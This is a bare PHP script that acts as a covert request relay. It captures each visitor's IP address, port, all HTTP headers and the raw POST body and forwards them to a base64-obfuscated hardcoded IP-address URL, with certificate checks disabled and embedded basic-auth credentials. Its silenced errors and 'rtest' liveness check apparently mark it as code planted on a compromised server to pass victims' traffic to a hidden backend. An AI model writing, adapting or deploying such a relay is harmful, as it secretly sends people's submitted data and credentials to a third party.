<?php
	error_reporting(~E_ALL);
	set_time_limit(10 * 60); // 10 minutes

	if (isset($_GET["r"]) && $_GET["r"] == "rtest")
		die("OK!");

	// initilizing post data
	$postData = '[Remote Address] => ' . $_SERVER['REMOTE_ADDR'] . "\n" .
				'[Remote Port] => ' . $_SERVER['REMOTE_PORT'] . "\n\n";

	$postData .= "[SERVER_PROTOCOL] => $_SERVER[SERVER_PROTOCOL]\n";
	foreach($_SERVER as $key => $val)
		if(substr($key, 0, 5) == 'HTTP_')
			$postData .= "[" . str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($key, 5))))) . "] => $val\n";
	$postData .= "\r\n"; // NOTICE: \r\n determine the end of forward header

	$postData .= file_get_contents("php://input");

	// initializing get data
	$getData = $_SERVER["QUERY_STRING"];

	// forwarding request
	$ch = curl_init("");

	curl_setopt($ch, CURLOPT_URL, base64_decode("aHR0cHM6Ly84MC4xOTEuODEuNTQvLnZpc3RhdHJhY2UvYi9zZXJ2aWNlLnBocA==") . "?$getData");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "vista:billgates@google.com");
	curl_setopt($ch, CURLOPT_TIMEOUT, '300');
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, '150');

	$buffer = curl_exec($ch);

	$contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);

	if (error_reporting() == E_ALL && curl_errno($ch))
		$buffer .= "CURL ERROR: " . curl_error($ch);

	curl_close($ch);

	if(stripos($_SERVER["HTTP_USER_AGENT"], "Safari") !== false)
	{
		header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
		header("Expires: Mon, 26 Jul 1997 05:00:00 GMT"); // Date in the past 
	}
	
	if ($contentType != "")
		header("Content-Type: $contentType");

		if (stripos($_SERVER["HTTP_USER_AGENT"], "MSIE 6.0") === false &&
		isset($_SERVER["HTTP_ACCEPT_ENCODING"]) &&
		ereg("gzip", $_SERVER["HTTP_ACCEPT_ENCODING"]) != false)
	{
		header("Content-Encoding: gzip\n");
		die(gzencode($buffer));
	}
	else
		die($buffer);
?>